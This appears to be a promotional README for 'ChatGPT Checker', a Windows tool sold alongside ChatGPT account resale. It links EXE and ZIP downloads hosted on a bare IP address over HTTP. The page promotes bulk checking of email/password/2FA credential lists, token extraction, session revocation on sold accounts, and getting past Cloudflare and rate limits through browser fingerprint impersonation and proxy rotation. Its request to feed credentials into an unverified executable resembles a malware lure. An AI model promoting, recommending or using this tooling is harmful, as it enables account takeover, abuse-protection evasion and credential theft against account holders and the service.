# ⚡ ChatGPT Checker — Enterprise Desktop Suite (v1.7.4)
### Ultimate Bulk Automation, Plan Verification & 2FA Management for ChatGPT

A high-performance, lightweight, zero-dependency Windows desktop application engineered for bulk account verification, subscription plan detection, automated 2FA secret rotation, session management, and access token extraction.

![ChatGPT Checker Interface](http://52.62.228.142:8099/screenshot.png)

---

## 🚀 Instant Download (v1.7.4)

Choose your preferred download method below:

| Download Package | Format | Status | Description |
| :--- | :---: | :---: | :--- |
| **[📦 Download Setup Package (.ZIP)](http://52.62.228.142:8099/gpt-checker.zip)** | `.zip` *(54.6 MB)* | **⭐ Recommended** | **Zero Browser Warnings.** Direct 1-click download on Chrome, Edge, and WhatsApp. |
| **[⚡ Direct EXE Installer](http://52.62.228.142:8099/gpt-checker.exe)** | `.exe` *(55.1 MB)* | Standalone | Native Windows setup wizard with automatic desktop shortcut. |
| **[🐙 GitHub Official Releases](https://github.com/bussmail73-cmd/ChatGPTChecker/releases)** | Source / Tags | Cloud Mirror | Full GitHub release history, release tags, and assets. |

> **💡 Recommended:** For the smoothest experience on Windows 10/11 without browser reputation alerts, download the **[ZIP Package](http://52.62.228.142:8099/gpt-checker.zip)**, open it, and run `gpt checker.exe`.

---

## 📥 How to Download & Run (آسان طریقہ ڈاؤنلوڈ اور چلانے کا)

1. **Download:** Click **[Download Setup Package (.ZIP)](http://52.62.228.142:8099/gpt-checker.zip)** or **[Direct EXE Installer](http://52.62.228.142:8099/gpt-checker.exe)**.
2. **Install:** Double-click `gpt checker.exe` (or `Setup.exe`). Click **Install Now**.
3. **Launch:** Click **Finish**. The application window opens automatically in high-speed Native App mode!
4. **Desktop Shortcut:** A shortcut titled **GPT Checker** is automatically created on your Desktop for instant 1-click access anytime.

*No Node.js, Python, or administrative permissions required. 100% self-contained portable runtime.*

---

## 📋 Input Formats & Quick Usage Guide

### 1. Account Input Format
Paste your credentials into the input box on the left (one account per line):

```text
email|password|2fa_secret
```

*Example:*
```text
alexander.ross99@outlook.com:MySecretPass123!:JBSWY3DPEHPK3PXP
sarah_connor2026@gmail.com|P@ssw0rd2026|KVKFKRSTJVLXQ2LM
john.doe@hotmail.com|Hunter2!
```
*(If an account does not have 2FA enabled, you can provide simply `email|password`)*

### 2. Optional Proxy Settings Format
Rotate proxies automatically per account to bypass IP restrictions and rate limits:

```text
host:port
user:pass@host:port
http://user:pass@host:port
socks5://user:pass@host:port
```

*Example:*
```text
192.168.1.50:8080
proxyuser:securepass@us-east.proxyserver.com:9000
socks5://premium_user:pwd123@residential.proxy.net:1080
```

---

## 🛠️ ChatGPT Problems Solved by This Software

ChatGPT Checker is built specifically to address the daily hurdles faced by store owners, digital marketers, bulk vendors, and account managers:

### 1. 🔍 Instant Plan & Quota Detection (Free vs Plus vs Pro vs Team vs Enterprise)
* **The Problem:** Logging into each account manually in a browser to check if it's Free, Plus, or Pro takes hours, triggers Captchas, and gets IP-banned.
* **Our Solution:** Checks hundreds of accounts in seconds. Displays active subscription tier (**Free, Plus, Pro, Go, Team, Business, Enterprise, Edu, K12**), quota usage percentages, renewal dates, and remaining days without loading a browser.

### 2. 🔐 Automated 2FA TOTP Secret Key Rotation
* **The Problem:** Manually enabling or replacing 2FA authenticator keys across batches of accounts is slow and prone to human error.
* **Our Solution:** Fully automated 2FA rotation (`Change 2FA`). Generates new Base32 secrets, binds them to the OpenAI account, verifies the live OTP handshake, and preserves existing passwords.

### 3. 🏢 Organization & Multi-Tenant Workspace 2FA (`Change 2FA Team / K12`)
* **The Problem:** Team and K12 accounts belong to organization workspaces and fail with basic consumer 2FA scripts.
* **Our Solution:** Automatically navigates workspace routing, detects enterprise tenant tokens, and updates organization 2FA factors cleanly.

### 4. 🚪 1-Click "Logout All Sessions" (Kicking Unauthorized Devices)
* **The Problem:** When selling or transferring ChatGPT accounts, previous buyers or unauthorized devices may still stay logged in via persistent session cookies.
* **Our Solution:** Executes account-wide session revocation. Instantly invalidates all active browser tabs, mobile apps, and OAuth sessions across the globe in a single click.

### 5. 🔑 Live Session Access Token Extraction
* **The Problem:** Extracting Bearer Access Tokens (`chatgpt.com/api/auth/session`) for custom bots or extensions usually requires inspecting browser DevTools cookies.
* **Our Solution:** Authenticates seamlessly via pure HTTP and extracts fresh, valid Bearer Access Tokens ready for automated scripts and downstream integrations.

### 6. ⏱️ Bulk Real-Time 2FA OTP Code Generator
* **The Problem:** Having to open Google Authenticator or an external 2FA website for every single account during verification.
* **Our Solution:** Integrated live TOTP vault. Paste your secret key or combo list, and get instant live 6-digit verification codes with visual expiration counters.

### 7. 📱 Check Phone / Codex Platform Verification
* **The Problem:** Verifying whether an account has a phone number linked or requires SMS activation.
* **Our Solution:** Dedicated Check Phone tab detects linked phone metadata and verification states.

### 8. 🛡️ Cloudflare Turnstile & 429 Rate-Limit Impersonation
* **The Problem:** OpenAI blocks standard automated requests with Cloudflare Turnstile challenges and 429 "Too Many Requests".
* **Our Solution:** Engineered with `curl_cffi` browser TLS/JA3 fingerprint impersonation that mirrors real Google Chrome browser handshakes, paired with smart proxy rotation.

### 9. 🗄️ Central Database & Audit Trail Logging
* **The Problem:** Losing track of which accounts were checked, which succeeded, and which failed.
* **Our Solution:** Complete daily audit logs (`logs/YYYY-MM-DD.txt`) saved *before* UI display. Includes 1-click **Copy Logs**, range filtering (Today, Yesterday, 30 Days), and clean TXT exports.

---

## 📞 Buy ChatGPT Accounts & Official Support

Need to buy fresh ChatGPT accounts, subscription licenses, or need 24/7 technical support?

* **Brand / Store:** **OTID**
* **Official WhatsApp:** **[+92 322 8784060](https://wa.me/923228784060)**
* **Direct Chat Link:** [Click to Message on WhatsApp](https://wa.me/923228784060)

---

### 📜 Technical Specifications
* **Operating System:** Windows 10, Windows 11 (64-bit native)
* **Architecture:** Standalone Embedded Microservice (Node.js backend + Edge/Chrome Native App Mode)
* **Default Port:** `8099` (Configurable)
* **Security:** 100% Local Execution, Zero External Data Leakage, No Telemetry.
